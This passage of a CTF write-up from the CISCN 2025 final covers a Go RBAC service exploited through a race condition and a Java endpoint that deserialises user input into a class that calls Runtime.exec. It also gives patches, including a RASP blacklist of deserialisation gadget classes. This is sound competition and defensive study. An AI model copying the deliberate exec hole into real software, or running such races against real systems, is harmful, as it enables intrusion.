                                <span class="token keyword">return</span> <span class="token string">"the directory "</span> <span class="token operator">+</span> param <span class="token operator">+</span> <span class="token string">" exists"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
                        <span class="token punctuation">&#125;</span>

                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">return</span> <span class="token string">"No Permission"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
                <span class="token punctuation">&#125;</span>

        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> funcName <span class="token operator">==</span> <span class="token string">"getFile"</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// read file</span>
                <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"file:read"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">if</span> strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                                <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"flag:read"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">&#123;</span>
                                        <span class="token keyword">return</span> <span class="token string">"No Permission"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
                                <span class="token punctuation">&#125;</span>

                        <span class="token punctuation">&#125;</span>
                        data<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span>
                        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
                                <span class="token keyword">return</span> <span class="token string">"file:"</span><span class="token operator">+</span>param<span class="token operator">+</span><span class="token string">" doesn't exist"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
                        <span class="token punctuation">&#125;</span>
                        content <span class="token operator">:=</span> <span class="token function">string</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
                        <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"file:return"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>
                                <span class="token keyword">return</span> <span class="token string">"the file "</span> <span class="token operator">+</span> param <span class="token operator">+</span> <span class="token string">" exists"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
                        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"file:return"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                                <span class="token keyword">return</span> content<span class="token punctuation">,</span> <span class="token boolean">nil</span>
                        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"file:return"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> RBACList<span class="token punctuation">[</span><span class="token string">"flag:return"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">&#123;</span>
                                <span class="token keyword">return</span> content<span class="token punctuation">,</span> <span class="token boolean">nil</span>
                        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                                <span class="token keyword">return</span> <span class="token string">"the file "</span> <span class="token operator">+</span> param <span class="token operator">+</span> <span class="token string">" exists"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
                        <span class="token punctuation">&#125;</span>

                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">return</span> <span class="token string">"No Permission"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
                <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token string">"No such func"</span><span class="token punctuation">,</span> errors<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"No such func"</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一个 RBAC 控制文件读取&amp;列目录的服务</p>
<h3 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h3><p>因为这题 fix 被很多队直接秒了，大胆猜测下面的判断条件加个 ! 即可</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"file:return"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string">"the file "</span> <span class="token operator">+</span> param <span class="token operator">+</span> <span class="token string">" exists"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"file:return"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> content<span class="token punctuation">,</span> <span class="token boolean">nil</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"file:return"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> RBACList<span class="token punctuation">[</span><span class="token string">"flag:return"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> content<span class="token punctuation">,</span> <span class="token boolean">nil</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string">"the file "</span> <span class="token operator">+</span> param <span class="token operator">+</span> <span class="token string">" exists"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h3><p>调试思路是直接 fmt.Println 打印出对应的变量，然后重新起服务 <code>go build main.go &amp;&amp; ./main</code></p>
<p>要想读取 flag 就要满足 flag:return 的值为 1，实际打印出来可以发现这里 flag:return 为 0</p>
<p>跟踪一下代码逻辑可以找到问题：</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">updateRBAC</span><span class="token punctuation">(</span>RBACToGrant <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token operator">:=</span> <span class="token keyword">range</span> RBACToGrant <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> strings<span class="token punctuation">.</span><span class="token function">HasSuffix</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token string">":read"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"rbac:change_read"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">&#123;</span>
                                RBACList<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value
                        <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> strings<span class="token punctuation">.</span><span class="token function">HasSuffix</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token string">":return"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">if</span> RBACList<span class="token punctuation">[</span><span class="token string">"rbac:change_return"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">&#123;</span>
                                RBACList<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value
                        <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> key <span class="token operator">==</span> <span class="token string">"rbac:change_return:1"</span> <span class="token punctuation">&#123;</span>
                        RBACList<span class="token punctuation">[</span><span class="token string">"rbac:change_return"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>

                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> key <span class="token operator">==</span> <span class="token string">"rbac:change_return:0"</span> <span class="token punctuation">&#123;</span>
                        RBACList<span class="token punctuation">[</span><span class="token string">"rbac:change_return"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>

                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                        RBACList<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value
                <span class="token punctuation">&#125;</span>

        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在这里给 flag:return 进行赋值，那么就需要 rbac:change_return 为 1，而 rbac:change_return 的初始值为 0</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// Grant temporary file:return permissions</span>
<span class="token keyword">if</span> value <span class="token operator">==</span> <span class="token string">"return"</span> <span class="token operator">&amp;&amp;</span> RBACList<span class="token punctuation">[</span><span class="token string">"rbac:change_return"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> maxDeep <span class="token operator">&lt;</span> <span class="token number">5</span> <span class="token punctuation">&#123;</span>
                RBACToGrant<span class="token punctuation">[</span><span class="token string">"rbac:change_return:1"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
                RBACToGrant<span class="token punctuation">[</span><span class="token string">"file:"</span><span class="token operator">+</span>value<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
                RBACToGrant<span class="token punctuation">[</span><span class="token string">"rbac:change_return:0"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
                maxDeep <span class="token operator">+=</span> <span class="token number">3</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">break</span>
        <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> maxDeep <span class="token operator">&lt;</span> <span class="token number">8</span> <span class="token punctuation">&#123;</span>
                RBACToGrant<span class="token punctuation">[</span><span class="token string">"file:"</span><span class="token operator">+</span>value<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
                maxDeep<span class="token operator">++</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">break</span>
        <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里会临时赋予 rbac:change_return 为 1 来给 file:return 赋值</p>
<p>打印一下 updateRBAC 方法内每次更新的 key，发现key的顺序会变动，考虑条件竞争在 rbac:change_return:1 时让 flag:return 和 file:return 竞争<br><img src="/blog/2025/07/21/CISCN-2025-Final/d563079c-fec8-4684-95c1-683abf6d1677.png"></p>
<p>本地和远程都很容易跑崩服务，请求包尽量改小一点可以避免502</p>
<p><img src="/blog/2025/07/21/CISCN-2025-Final/54ecc6e7-9d40-4b57-81d0-c5c7160aa1aa.png"></p>
<br>

<p>本地部署的14b大模型早已看穿这一切（</p>
<p><img src="/blog/2025/07/21/CISCN-2025-Final/image-20250724174513798.png" alt="image-20250724174513798"></p>
<hr>
<h2 id="web-security-rasp"><a href="#web-security-rasp" class="headerlink" title="web-security_rasp"></a>web-security_rasp</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>awdp<span class="token punctuation">.</span>securityRasp<span class="token punctuation">.</span></span><span class="token class-name">Controller</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>awdp<span class="token punctuation">.</span>securityRasp<span class="token punctuation">.</span>user<span class="token punctuation">.</span>admin</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span><span class="token class-name">ScriptException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PostMapping</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@RestController</span>
<span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/user"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/info"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">ser</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> data<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ScriptException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        admin user <span class="token operator">=</span> <span class="token punctuation">(</span>admin<span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>awdp<span class="token punctuation">.</span>securityRasp<span class="token punctuation">.</span>user</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> admin <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> cmd<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token class-name">NoBackDoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>很明显的反序列化调用 NoBackDoor，全靠 rasp 配置来防</p>
<h3 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h3><p>直接看 lib ，里面有 c3p0，jackson 等</p>
<p>在 rasp 里的 official.js 过滤对应类即可</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// transformer 反序列化攻击</span>
<span class="token literal-property property">deserialization_blacklist</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span>   <span class="token string">'算法1 - 反序列化黑名单过滤'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">action</span><span class="token operator">:</span> <span class="token string">'block'</span><span class="token punctuation">,</span>
<span class="token literal-property property">clazz</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token string">'org.apache.commons.collections.functors.ChainedTransformer'</span><span class="token punctuation">,</span>
        <span class="token string">'org.apache.commons.collections.functors.InvokerTransformer'</span><span class="token punctuation">,</span>
        <span class="token string">'org.apache.commons.collections.functors.InstantiateTransformer'</span><span class="token punctuation">,</span>
        <span class="token string">'org.apache.commons.collections4.functors.InvokerTransformer'</span><span class="token punctuation">,</span>
        <span class="token string">'org.apache.commons.collections4.functors.InstantiateTransformer'</span><span class="token punctuation">,</span>
        <span class="token string">'org.codehaus.groovy.runtime.ConvertedClosure'</span><span class="token punctuation">,</span>
        <span class="token string">'org.codehaus.groovy.runtime.MethodClosure'</span><span class="token punctuation">,</span>
        <span class="token string">'org.springframework.beans.factory.ObjectFactory'</span><span class="token punctuation">,</span>
        <span class="token string">'org.apache.xalan.xsltc.trax.TemplatesImpl'</span><span class="token punctuation">,</span>
        <span class="token string">'com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl'</span><span class="token punctuation">,</span>
        <span class="token string">'com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase'</span><span class="token punctuation">,</span>
        <span class="token string">'com.fasterxml.jackson.databind.node.POJONode'</span><span class="token punctuation">,</span>
        <span class="token string">'com.fasterxml.jackson.annotation.JsonTypeInfo'</span><span class="token punctuation">,</span>
        <span class="token string">'com.sun.org.apache.xalan.internal.xsltc.trax'</span><span class="token punctuation">,</span>
        <span class="token string">'com.fasterxml.jackson.databind.ObjectMapper'</span><span class="token punctuation">,</span>
        <span class="token string">'javassist.ClassPool'</span><span class="token punctuation">,</span>
        <span class="token string">'javassist.CtClass'</span><span class="token punctuation">,</span>
        <span class="token string">'javassist.CtMethod'</span><span class="token punctuation">,</span>
        <span class="token string">'javax.management'</span><span class="token punctuation">,</span>
        <span class="token string">'javax.swing'</span><span class="token punctuation">,</span>
        <span class="token string">'com.sun.org.apache.xml.internal'</span><span class="token punctuation">,</span>
        <span class="token string">'com.sun.syndication.feed.impl'</span><span class="token punctuation">,</span>
        <span class="token string">'java.security'</span><span class="token punctuation">,</span>
        <span class="token string">'com.mchange.v2.c3p0.WrapperConnectionPoolDataSource'</span><span class="token punctuation">,</span>
        <span class="token string">'sun.rmi.server.MarshalOutputStream'</span><span class="token punctuation">,</span>
        <span class="token string">'org.springframework.context.support.ClassPathXmlApplicationContext'</span><span class="token punctuation">,</span>
        <span class="token string">'org.slf4j.ext.EventData'</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<hr>
<h2 id="web-ota（Unsolved）"><a href="#web-ota（Unsolved）" class="headerlink" title="web-ota（Unsolved）"></a>web-ota（Unsolved）</h2><p>java17</p>
<p>byd附件给的jar包有问题不能直接起</p>
<p>要手动给 jwt.secret 赋 32 位长度的密钥才能启动，交个附件原包上去都check失败可太逆天了（</p>
<h3 id="fix-2"><a href="#fix-2" class="headerlink" title="fix"></a>fix</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>ota<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>core<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileSystemResource</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>function<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">RouterFunction</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>function<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">RouterFunctions</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>function<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">ServerResponse</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Configuration</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WebConfig</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Bean</span>
    <span class="token keyword">public</span> <span class="token class-name">RouterFunction</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ServerResponse</span><span class="token punctuation">></span></span> <span class="token function">route</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token class-name">RouterFunctions</span><span class="token punctuation">.</span><span class="token function">resources</span><span class="token punctuation">(</span><span class="token string">"/static/**"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">FileSystemResource</span><span class="token punctuation">(</span><span class="token string">"/opt/static/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
